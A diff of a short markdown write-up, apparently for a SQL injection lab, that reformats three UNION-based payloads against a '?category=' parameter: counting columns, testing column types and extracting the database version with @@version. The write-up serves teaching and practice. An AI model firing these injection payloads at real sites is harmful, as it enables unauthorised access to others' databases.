@@ -14,14 +14,14 @@ date: 2023-04-25
 
 ## Exp
 1. Consider # of column
-Payload: `?category=Accessories' union select NULL,NULL -- #`
+    
+    Payload: `?category=Accessories' union select NULL,NULL -- #`
 2. Consider column type
-Payload: `?category=Accessories' union select 'a','a' -- #`
+
+    Payload: `?category=Accessories' union select 'a','a' -- #`
 Both of them contained text.
 3. Attack
-Payload: `?category=Accessories' union select 'abc',@@version -- #`
-    :::spoiler Success Screenshot
-    ![](https://i.imgur.com/vOx5kCK.png)
-    :::
+    
+    Payload: `?category=Accessories' union select 'abc',@@version -- #`
 
-## Reference
+![](https://i.imgur.com/vOx5kCK.png)
